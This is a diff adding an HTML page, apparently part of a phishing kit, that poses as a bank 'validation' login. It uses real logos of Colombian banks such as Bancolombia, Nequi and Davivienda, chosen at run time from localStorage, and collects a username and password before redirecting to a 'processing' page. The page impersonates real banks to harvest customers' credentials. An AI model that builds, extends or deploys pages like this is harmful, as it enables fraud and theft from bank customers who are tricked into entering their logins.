@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Validación Bancaria</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+body {
+    margin: 0;
+    background: #0f0f0f;
+    font-family: 'Inter', sans-serif;
+    color: #fff;
+}
+
+.container {
+    max-width: 420px;
+    margin: 50px auto;
+    background: #1a1a1a;
+    padding: 30px 25px;
+    border-radius: 16px;
+    box-shadow: 0 0 25px rgba(0,0,0,0.25);
+    text-align: center;
+}
+
+.bank-logo {
+    width: 130px;
+    margin-bottom: 18px;
+}
+
+.bank-name {
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 25px;
+}
+
+label {
+    display: block;
+    margin: 14px 0 5px;
+    font-size: 14px;
+    color: #cccccc;
+    text-align: left;
+}
+
+input {
+    width: 100%;
+    padding: 15px;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 15px;
+    margin-bottom: 15px;
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    background: #00c8ff;
+    color: #000;
+    border: none;
+    font-size: 17px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-top: 5px;
+}
+
+button:hover {
+    background: #22dbff;
+}
+
+/* FOOTER */
+footer {
+    margin-top: 40px;
+    padding: 20px;
+    font-size: 13px;
+    color: #777;
+    text-align: center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- LOGO DEL BANCO DINÁMICO -->
+    <img id="bankLogo" class="bank-logo" src="">
+
+    <!-- NOMBRE DINÁMICO DEL BANCO -->
+    <div id="bankName" class="bank-name"></div>
+
+    <!-- FORMULARIO -->
+    <label>Usuario</label>
+    <input type="text" placeholder="Ingrese su usuario">
+
+    <label>Contraseña</label>
+    <input type="password" placeholder="Ingrese su contraseña">
+
+    <button onclick="procesar()">Validar</button>
+</div>
+
+<footer>
+    © 2025 Validación Bancaria. Todos los derechos reservados.
+</footer>
+
+<script>
+// LISTA DE LOGOS PARA TODOS LOS BANCOS
+const logos = {
+    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/5/5a/Logo_Bancolombia.png",
+    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/8/89/Nequi_logo_2021.png",
+    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-davivienda.png",
+    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/8/8b/BBVA_Logo.svg",
+    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/8/8e/Banco_Popular_logo.png",
+    "Banco de Bogotá": "https://upload.wikimedia.org/wikipedia/commons/8/89/Banco_de_Bogota_logo.svg",
+    "Itaú": "https://upload.wikimedia.org/wikipedia/commons/0/0a/Itau_logo.png"
+};
+
+// RECUPERAR EL BANCO SELECCIONADO
+const bank = localStorage.getItem("bankName") || "Validación";
+
+// APLICAR LOGO
+document.getElementById("bankLogo").src = logos[bank] || "";
+document.getElementById("bankName").innerText = `Validación ${bank}`;
+
+function procesar() {
+    window.location.href = "procesando.html";
+}
+</script>
+
+</body>
+</html>
